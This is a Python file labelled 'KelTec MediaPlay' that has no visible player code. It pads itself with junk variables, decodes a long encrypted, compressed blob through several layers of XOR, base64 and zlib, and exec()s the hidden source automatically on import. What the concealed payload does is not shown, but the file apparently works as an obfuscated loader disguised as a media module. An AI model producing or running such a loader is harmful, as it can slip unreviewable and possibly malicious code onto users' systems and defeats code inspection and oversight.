# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 116306 ^ 102015
_lx1_1 = len("bb102b")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-413886)
_lx3_3 = 590856 * 0
_lx4_4 = 965292 ^ 946469
_K = '74eddc86959305217204a24f266cecaf9f0d31775e439e397fdeb87c788505e6'
_M = 'QA7izAy0iMLSsbbQNU0gPzD3ozAKuMaRdbpiVVT9tRUYDrWCDKHbkY60uItjHyI+ZfSqPg+4wMAn7jRTWPCzRxRfttBU8tGR3OW0'
_D = '==A12RXh0CBvqCgfYZrtpgmL7Bqqc97txsirhogyhk3x3y/1tmaijzruqu1J45nG+S6RMMCRJIzaRMqCL8aa4l2mrzDPvxY8HEctlxdyKtPAjgOVSiYQN0rXin3frWsAzeB9JpHqC4Dl1QGtjhHffSx7ENQBwUS2eKcXHu6xr/hz1Zvoet5qrnzQ8KjnfDFizo2MInOuZCk75IlEQTM/+YWuHiwlXkk8Sbm5/fseochCO+HM6uCS2ut8zJhEl9Bli/8/ah9FUvNG7Rg6cS6G/O+tQloYrCyUSquvT8HA813BqxRkWtbEAQozuJHmFH+/4jpqm1koxR0FX0HvLt2OryS7bDwHnObeFbRLw6jy5sl0M3+Br57z2teQqQJFxwWkLw5bOZVCdatWtj8Few+6BDGv60a5uUejcdSIUw1I88SG/H8FMNwLMu+/O6rf7eq/+GdimkQR8Qig4rgTFeFy76zm6LEWdsY8d4MZAjORo1LEGDVD7IXogwFl143UvTb62PeweslfnWVGOo8InpjRPs6Mx9pxxJcz7+WAztJSW1e61cG4ayZZ5ljEDFru2kriUx+lGdK4M8KsWx65Y6KYNQr0oQiVg9+l7k1H1SXLPblUM2Zwvgf+KUvWC4aG6ntyJR9bN2UpGKp3MNwe5m5EutkVHUmFPhFCcDIyVynHHVtdMhXqr35rMCUIPQNOKBbcW5GlJtq4pfMajYcugkFefbLKEV/hIufmKSa709JMP1XnHlSzwz8BvXPqkl02jseK1Q7X2MQKuAy4i635YiXJGLpj47wEIVtXleCylq+iibMLGczR7RcN2pZyC1KmvfNHQzdoK+e4Cq72z5ez0SGckC/p60sY9UXwz3XMFZppwCKLmRa2PLYrPq184+o2QynC5mYmbT8kRfkB/K2sMoTnqIIyOfLb6G6nwaU4f8XU07aacUU2M3hXjCIUy4gpwy3GkXV+zw2n4dju860SFn8lX66evDbi+u5yzJTjD60cNAfA94AEKLapZuW/+2wj2ToxHwOEkB5dRzFDghqbCIKwthTdMQedGa2iL7R0+h7psG+TFPFiQ80FK5f4LGK4LMKMh87duwYb7Q+chJT+Wdpga2Rn4CeuIEE4K3TPeC5V5M1VNsR+yx15JJ3mpAcVAvhND9vq6Myj0HHL1+KJ7aAQsCEHyNCJk5rt2Tu2hMRYVcxqLXhl8HDf/FwxgWKn1SDRGUOVsj0xUWaTFJXys2C0BRcISzwnnhw1+qasSX/VSg0Fg0M9Poi0rU39q5eo3QV4qofdAzFFnVnj9G9EjHMv4EFbpXOS/0cNYEd22WCLIIzT6aB8VdS3i1GPcI9c9FIz31sECAnAHTt7+ycYQOO1+epr7SurTrrgnefnZ0yURIMzTj/DmZWVWoLC+uDIDWoLE53hFiOZ8YYGod/qIOqd6H0nGcHWkdOy4mL/dUj4NfTWJsEAS0DUsn8Ylv9mWXqcLnve6Tx7jVvT3uvrB5SMA3b+rE/AdmHh5kvEwn6Zyt7Uw9EQtRCd3gXwJ15PlJDPQe65ov4HFw9oHNFrGo1otoKzlNfTF5ZkGYtn4eoKi7e39JxFpMp3o5sYUY+g79JUlwRxo4AT4/6SacZjqBHuurMYv2gqo0cECYIeprRc1ZMAQqnR+NbYYLm1AApQ0e6lZEcnfTvtr2wGXn0BovSgptaUPFlw0umxjozguV4RcDwQtA2E7sJLSDASfARImg0zmE9W7LeGrCg/J54hhCW2XGlkWfBhyeTadsoTqv6r0KT+NDhx6OjbmZIeiswpeMC2YFqDIqEnjMWAgq/sz2rlu05A2OqzTsm2EaaU9wFcW4Cx8knUyG/tpTAo2JskC1kU'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})